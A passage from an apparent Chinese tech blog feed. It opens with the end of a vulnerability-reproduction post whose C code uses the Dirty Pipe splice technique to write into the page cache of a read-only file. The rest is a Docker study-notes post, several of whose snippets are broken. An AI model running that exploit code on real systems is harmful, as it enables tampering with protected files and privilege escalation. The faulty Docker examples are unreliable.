boundary\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* open the input file and validate the specified offset */</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> fd = open(path, O_RDONLY); <span class="comment">// yes, read-only! :-)</span></span><br><span class="line"><span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;open failed&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"><span class="keyword">if</span> (fstat(fd, &amp;st)) &#123;</span><br><span class="line">perror(<span class="string">&quot;stat failed&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (offset &gt; st.st_size) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Offset is not inside the file\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (end_offset &gt; st.st_size) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot enlarge the file\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* create the pipe with all flags initialized with</span></span><br><span class="line"><span class="comment">   PIPE_BUF_FLAG_CAN_MERGE */</span></span><br><span class="line"><span class="type">int</span> p[<span class="number">2</span>];</span><br><span class="line">prepare_pipe(p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* splice one byte from before the specified offset into the</span></span><br><span class="line"><span class="comment">   pipe; this will add a reference to the page cache, but</span></span><br><span class="line"><span class="comment">   since copy_page_to_iter_pipe() does not initialize the</span></span><br><span class="line"><span class="comment">   &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span></span><br><span class="line">--offset;</span><br><span class="line"><span class="type">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;splice failed&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (nbytes == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short splice\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the following write will not create a new pipe_buffer, but</span></span><br><span class="line"><span class="comment">   will instead write into the page cache, because of the</span></span><br><span class="line"><span class="comment">   PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class="line">nbytes = write(p[<span class="number">1</span>], data, data_size);</span><br><span class="line"><span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;write failed&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((<span class="type">size_t</span>)nbytes &lt; data_size) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short write\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;It worked!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考:<a href="https://mp.weixin.qq.com/s/6VhWBOzJ7uu80nzFxe5jpg">https://mp.weixin.qq.com/s/6VhWBOzJ7uu80nzFxe5jpg</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker学习笔记</title>
      <link href="/2022/04/17/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/04/17/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="docker学习笔记"><a href="#docker学习笔记" class="headerlink" title="docker学习笔记"></a>docker学习笔记</h1><h3 id="1-什么是docker"><a href="#1-什么是docker" class="headerlink" title="1.什么是docker?"></a>1.什么是docker?</h3><p>1.docker是一种基于容器的虚拟化技术，可以让开发者将开发的软件以及依赖打包成一个镜像然后发布到任何流行的linux或windows服务器上面，并且跟重要的是，在实际的生产环境中，开发和运维的环境往往会不相同，经常可能导致开发在开发的环境下可以运行但是迁移到运维的机器上就运行不了，docker的出现解决了这些环境不一致性的问题。</p><h3 id="2-为什么要用docker"><a href="#2-为什么要用docker" class="headerlink" title="2.为什么要用docker?"></a>2.为什么要用docker?</h3><p>作为一种新兴的虚拟化方式，Docker 跟传统的虚拟化方式相比具有众多的优势。</p><ul><li>更高效的系统利用资源</li></ul><p>由于容器不需要进行硬件虚拟以及运行完整操作系统等额外开销，Docker 对系统资源的利用率更高。无论是应用执行速度、内存损耗或者文件存储速度，都要比传统虚拟机技术更高效。因此，相比虚拟机技术，一个相同配置的主机，往往可以运行更多数量的应用。</p><ul><li>更快速的启动时间</li></ul><p>由于容器不需要进行硬件虚拟以及运行完整操作系统等额外开销，Docker 对系统资源的利用率更高。无论是应用执行速度、内存损耗或者文件存储速度，都要比传统虚拟机技术更高效。因此，相比虚拟机技术，一个相同配置的主机，往往可以运行更多数量的应用。</p><ul><li>一致的运行环境</li></ul><p>开发过程中一个常见的问题是环境一致性问题。由于开发环境、测试环境、生产环境不一致，导致有些 bug 并未在开发过程中被发现。而 Docker 的镜像提供了除内核外完整的运行时环境，确保了应用运行环境一致性，从而不会再出现 「这段代码在我机器上没问题啊」 这类问题。</p><ul><li>持续交付和部署</li></ul><p>对开发和运维（DevOps）人员来说，最希望的就是一次创建或配置，可以在任意地方正常运行。<br>使用 Docker 可以通过定制应用镜像来实现持续集成、持续交付、部署。开发人员可以通过 Dockerfile 来进行镜像构建，并结合 持续集成(Continuous Integration) 系统进行集成测试，而运维人员则可以直接在生产环境中快速部署该镜像，甚至结合 持续部署(Continuous Delivery&#x2F;Deployment) 系统进行自动部署。<br>而且使用 Dockerfile 使镜像构建透明化，不仅仅开发团队可以理解应用运行环境，也方便运维团队理解应用运行所需条件，帮助更好的生产环境中部署该镜像。</p><ul><li>更轻松的迁移</li></ul><p>由于 Docker 确保了执行环境的一致性，使得应用的迁移更加容易。Docker 可以在很多平台上运行，无论是物理机、虚拟机、公有云、私有云，其运行结果是一致的。因此用户可以很轻易的将在一个平台上运行的应用，迁移到另一个平台上，而不用担心运行环境的变化导致应用无法正常运行的情况。</p><ul><li>更轻松的维护和扩展</li></ul><p>Docker 使用的分层存储以及镜像的技术，使得应用重复部分的复用更为容易，也使得应用的维护更新更加简单，基于基础镜像进一步扩展镜像也变得非常简单。此外，Docker 团队同各个开源项目团队一起维护了一大批高质量的 官方镜像，既可以直接在生产环境使用，又可以作为基础进一步定制，大大的降低了应用服务的镜像制作成本。</p><h3 id="3-docker架构"><a href="#3-docker架构" class="headerlink" title="3.docker架构"></a>3.docker架构</h3><h5 id="1-docker三个概念"><a href="#1-docker三个概念" class="headerlink" title="1.docker三个概念"></a>1.docker三个概念</h5><ul><li><p>容器</p><p>容器时镜像的运行实例，容器可以启动,停止,删除</p></li><li><p>镜像</p><p>创建docker容器的模板，相当于一个根文件系统，在docker运行的时候，docker会将镜像挂载</p></li><li><p>仓库</p><p>存储docker镜像的仓库</p><p>docker实现结构</p><p><img src="/images/docker-on-linux.png" alt="&quot;docker&quot;"></p></li></ul><h5 id="2-docker体系结构"><a href="#2-docker体系结构" class="headerlink" title="2.docker体系结构"></a>2.docker体系结构</h5><p>docker采用C&#x2F;S结构，docker daemon作为server接收client的请求，client和server可以运行在同一台机器上，也可以使用socket通信的方式运行在不同的机器上面</p><ul><li>docker守护进程(docker deamon)</li></ul><p>docker在后台运行的服务端程序,等待docker client的请求</p><ul><li><p>docker客户端(docker client)</p><p>是用户与Docker交互方式。它接受用户指令并且与背后的Docker守护进程通信。</p></li></ul><h3 id="4-docker组件"><a href="#4-docker组件" class="headerlink" title="4.docker组件"></a>4.docker组件</h3><h5 id="1-docker镜像"><a href="#1-docker镜像" class="headerlink" title="1.docker镜像"></a>1.docker镜像</h5><p>docker镜像是用于创建docker容器的模板，相当于面向对象编程中的类，一个docker镜像可以创建个docker容器</p><p><strong>获取docker镜像</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取一个nginx:alpine镜像。</span></span><br><span class="line">docker pull nginx:alpine </span><br></pre></td></tr></table></figure><p><strong>构建docker镜像</strong><br>使用Dockerfile进行构建docker镜像(后面会提到)</p><h5 id="2-docker容器"><a href="#2-docker容器" class="headerlink" title="2.docker容器"></a>2.docker容器</h5><p>实际提供服务的docker实例，基于docker镜像进行创建<br><strong>创建并运行容器</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">docker run -it image:tag <span class="built_in">command</span></span><br><span class="line"><span class="comment">#-i(interactive)以交互方式启动docker容器</span></span><br><span class="line"><span class="comment">#-t(tty)分配一个tty</span></span><br><span class="line"><span class="comment">#--hostname 指定容器内的主机名</span></span><br><span class="line"><span class="comment">#--name 指定容器的名称</span></span><br><span class="line"><span class="comment">#--privileged 赋予容器root权限</span></span><br><span class="line"><span class="comment">#-p 指定端口映射</span></span><br><span class="line"><span class="comment">#-v 映射容器卷</span></span><br><span class="line"><span class="comment">#command 指需要执行的命令</span></span><br><span class="line"><span class="comment">#注意:正在运行的docker容器一定要有一个前台进程,否则该docker会认为没有正在运行的进程,即退出该容器</span></span><br></pre></td></tr></table></figure><p><strong>启动或停止docker容器</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看所有的容器</span></span><br><span class="line">docker ps -a</span><br><span class="line"><span class="comment">#启动一个docker容器</span></span><br><span class="line">docker start $(container_id)</span><br><span class="line">docker stop $(container_id)</span><br></pre></td></tr></table></figure><p><strong>和docker容器进行交互</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it /bin/bash</span><br><span class="line"><span class="comment">#在容器内重新开启一个shell,并且进入到该shell</span></span><br><span class="line">docker attach container_id</span><br><span class="line"><span class="comment">#进入到指定容器id内正在运行的终端</span></span><br><span class="line">docker top container_id</span><br><span class="line"><span class="comment">#查看某容器内的进程情况</span></span><br><span class="line">docker logs container_id</span><br><span class="line"><span class="comment">#查看某容器的日志</span></span><br><span class="line">docker inspect container_id</span><br><span class="line"><span class="comment">#查看某容器的配置以及详细信息</span></span><br><span class="line">docker commit -a <span class="string">&quot;&quot;</span> -m <span class="string">&quot;&quot;</span> container_id image:tag</span><br><span class="line"><span class="comment">#将某一个容器打包成镜像</span></span><br><span class="line">docker <span class="built_in">export</span> container_id &gt; ubuntu.tar</span><br><span class="line"><span class="comment">#导出一个docker容器(不包含映射的容器卷以及映射路径)</span></span><br><span class="line"><span class="built_in">cat</span> docker/ubuntu.tar | docker import - <span class="built_in">test</span>/ubuntu:v1</span><br><span class="line"><span class="comment">#将一个tar包导入成docker镜像</span></span><br><span class="line">docker <span class="built_in">rm</span> container_id</span><br><span class="line"><span class="comment">#删除一个docker容器</span></span><br></pre></td></tr></table></figure><h5 id="3-docker数据卷"><a href="#3-docker数据卷" class="headerlink" title="3.docker数据卷"></a>3.docker数据卷</h5><p>  因为docker容器中的数据在docker容器删除后会全部消失,因此可以借助docker容器数据卷来实现docker容i数据的本地持久化。docker容器数据卷永久有效,除非手动删除,并且docker数据卷可以让多个docker容器共享数据</p><p><strong>数据卷的创建</strong><br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker volume create volume_name</span><br></pre></td></tr></table></figure></p><p><strong>数据卷的挂载</strong><br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">  docker run -it -v volume_name:container_path image_name</span><br><span class="line">``````</span><br><span class="line"></span><br><span class="line"><span class="comment">##### 4.docker网络</span></span><br><span class="line"></span><br><span class="line">为docker容器提供网络</span><br><span class="line">docker网络中一共有5种网络模式</span><br><span class="line"></span><br><span class="line">* bridge</span><br><span class="line">  docker的默认网络模式,创建一块虚拟网卡连接上物理网卡,所有的docker将库创建一对虚拟接口,veth&amp;eth0一个在容器内，一个在网桥上,网桥提供路由功能,(可以想象为虚拟机内的nat模式)</span><br><span class="line"></span><br><span class="line">* macvlan</span><br><span class="line">  创建一个虚拟网卡,直接连接至物理网卡,该网络模式下容器分配的ip地址和物理机在同一个网段(相当于虚拟机内的桥接模式)</span><br><span class="line"></span><br><span class="line">* host</span><br><span class="line">  与宿主机共享网卡</span><br><span class="line"></span><br><span class="line">* container</span><br><span class="line">  和已经存在的容器共享一块网卡</span><br><span class="line"></span><br><span class="line">* none</span><br><span class="line">  不创建网络,无法联网  </span><br><span class="line"></span><br><span class="line">**docker网络的创建**</span><br><span class="line">```bash</span><br><span class="line">  <span class="comment">#创建一个桥接的docker网络</span></span><br><span class="line">docker network creat -d bridge --subnet=172.20.0.1/24 --gateway=172.20.0.1 -o parent=eth0 mybridge</span><br></pre></td></tr></table></figure></p><h5 id="5-dockerfile"><a href="#5-dockerfile" class="headerlink" title="5.dockerfile"></a>5.dockerfile</h5><p><strong>什么是Dockerfile?</strong><br>  dockerfile是一个用于构建docker镜像的脚本,docker可以读取dockerfile文件自动构建docker镜像<br><strong>dockerfile如何使用?</strong><br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#当dockerfile命名为Dockerfile并且当前在dockerfile路径下,如果命名不一样需要在构建镜像的时候用-f指定构建脚本</span></span><br><span class="line">docker build -t name:tag .</span><br><span class="line"><span class="comment">#指定dockerfile文件路径</span></span><br><span class="line">docker build -f /path/to/dockerfile -t name:tag</span><br></pre></td></tr></table></figure><br> <strong>docker语法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">FROM</span><br><span class="line"><span class="comment">#表明以哪个镜像作为基础镜像</span></span><br><span class="line">MAINTAINER</span><br><span class="line"><span class="comment">#表明构建镜像的作者</span></span><br><span class="line">WORKDIR</span><br><span class="line"><span class="comment">#表明工作的初始路径</span></span><br><span class="line">RUN</span><br><span class="line"><span class="comment">#表明运行的命令</span></span><br><span class="line">EXPOSE</span><br><span class="line"><span class="comment">#表明暴露的端口</span></span><br><span class="line">CMD</span><br><span class="line"><span class="comment">#表明默认运行的命令</span></span><br></pre></td></tr></table></figure><p>  <strong>实例dockerfile</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:latest</span><br><span class="line"><span class="keyword">MAINTAINER</span> bugprogram-git</span><br><span class="line"><span class="keyword">ENV</span> TZ=Asia/Shanghai</span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&#x27;s/archive.ubuntu.com/mirrors.aliyun.com/g&#x27;</span> /etc/apt/sources.list \ </span></span><br><span class="line">&amp;&amp; apt-get update \</span><br><span class="line">&amp;&amp; ln -snf /usr/share/zoneinfo/$TZ /etc/localtime </span><br><span class="line">&amp;&amp; echo $TZ &gt; /etc/timezone \</span><br><span class="line">apt-get install -y tzdata unzip wget npm curl \</span><br><span class="line">&amp;&amp; apt-get clean \</span><br><span class="line">&amp;&amp; apt-get autoclean \</span><br><span class="line">&amp;&amp; rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> /minecraft \</span></span><br><span class="line"><span class="language-bash">&amp;&amp; <span class="built_in">mkdir</span> /minecraft/dashboard \</span></span><br><span class="line"><span class="language-bash">&amp;&amp; wget https://github.com/Suwings/MCSManager/archive/refs/tags/v8.6.23.zip \</span></span><br><span class="line"><span class="language-bash">&amp;&amp; unzip v8.6.23.zip -d /minecraft/dashboard </span></span><br><span class="line"><span class="comment">#同样的后面的文件名以及解压的目录名要根据实际情况进行修改</span></span><br><span class="line">&amp;&amp; mv /minecraft/dashboard/MCSManager-<span class="number">8.6</span>.<span class="number">23</span>/* /minecraft/dashboard </span><br><span class="line">&amp;&amp; rm -rf /minecraft/dashboard/MCSManager-<span class="number">8.6</span>.<span class="number">23</span> \</span><br><span class="line">&amp;&amp; apt purge  -y unzip wget \</span><br><span class="line">&amp;&amp; apt autoremove -y \</span><br><span class="line">&amp;&amp; rm /v8.<span class="number">6.23</span>.zip \</span><br><span class="line">&amp;&amp; cd /minecraft/dashboard &amp;&amp; npm install</span><br><span class="line"><span class="keyword">EXPOSE</span> [<span class="number">19132</span>,<span class="number">23333</span>]</span><br><span class="line"><span class="comment">#对外暴露的端口</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> <span class="built_in">cd</span> /minecraft/dashboard/ &amp;&amp; npm start</span></span><br></pre></td></tr></table></figure><h3 id="5-docker安装和配置"><a href="#5-docker安装和配置" class="headerlink" title="5.docker安装和配置"></a>5.docker安装和配置</h3><h5 id="1-docker安装"><a href="#1-docker安装" class="headerlink" title="1.docker安装"></a>1.docker安装</h5><h6 id="1-脚本安装"><a href="#1-脚本安装" class="headerlink" title="1.脚本安装"></a>1.脚本安装</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com -o get-docker.sh</span><br><span class="line">./get-docker.sh</span><br></pre></td></tr></table></figure><h6 id="2-包管理器安装"><a href="#2-包管理器安装" class="headerlink" title="2.包管理器安装"></a>2.包管理器安装</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#基于archlinux</span></span><br><span class="line">pacman -S docker</span><br><span class="line"><span class="comment">#基于debian/ubuntu</span></span><br><span class="line">apt install docker.io</span><br></pre></td></tr></table></figure><h5 id="2-docker配置"><a href="#2-docker配置" class="headerlink" title="2.docker配置"></a>2.docker配置</h5><p><strong>docker配置非root用户使用</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#如果系统不存在docker组</span></span><br><span class="line">groupadd docker</span><br><span class="line">usermod -aG docker <span class="variable">$&#123;USER&#125;</span><span class="comment">#</span></span><br><span class="line">newgrp docker</span><br><span class="line">systemctl restart </span><br><span class="line"><span class="comment">#重新登陆系统生效</span></span><br><span class="line"><span class="comment">#-a(append)附加</span></span><br><span class="line"><span class="comment">#-G指定组</span></span><br></pre></td></tr></table></figure><p><strong>docker换源</strong><br>编辑&#x2F;etc&#x2F;docker&#x2F;daemon.json文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;https://hub-mirror.c.163.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https://ustc-edu-cn.mirror.aliyuncs.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https://ghcr.io&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https://mirror.baidubce.com&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#换源后需要重启docker才能生效</span></span><br></pre></td></tr></table></figure><p><strong>docker的启动和停止</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用systemd进行管理docker启动和停止</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#docker启动</span></span><br><span class="line">systemctl start docker.service</span><br><span class="line"></span><br><span class="line"><span class="comment">#docker停止</span></span><br><span class="line">systemctl stop docker.service</span><br></pre></td></tr></table></figure><h3 id="6-docker-compose"><a href="#6-docker-compose" class="headerlink" title="6.docker-compose"></a>6.docker-compose</h3><h5 id="1-什么是docker-compose"><a href="#1-什么是docker-compose" class="headerlink" title="1.什么是docker-compose?"></a>1.什么是docker-compose?</h5><p>  docker-compose是一个用python写的容器编排工具,在连续部署多个容器的时候,可以使用一个docker-compose脚本实现一次部署多个容器,大大提高了容器编排效率</p><h5 id="2-如何使用docker-compose进行容器编排？"><a href="#2-如何使用docker-compose进行容器编排？" class="headerlink" title="2.如何使用docker-compose进行容器编排？"></a>2.如何使用docker-compose进行容器编排？</h5><p><strong>实例</strong><br>  <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3.0&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">  <span class="comment">#容器名称</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="comment">#指定构建的上下文路径</span></span><br><span class="line">    <span class="attr">image:</span></span><br><span class="line">    <span class="comment">#指定镜像的名称</span></span><br><span class="line">      <span class="string">nginx:alpine</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="comment">#指定映射的端口</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;5000:5000&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">    <span class="comment">#指定挂载的容器卷</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">volumes:/code</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">redis</span></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis:latest</span></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line"><span class="comment">#定义网络</span></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">default:</span></span><br><span class="line">    <span class="attr">external:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">my-pre-existing-network</span></span><br><span class="line">      <span class="comment">#这里不能使用默认的docker0网络,只能使用用户自定义的网络</span></span><br></pre></td></tr></table></figure></p><p>docker-compose常用的一些属性如下:</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span 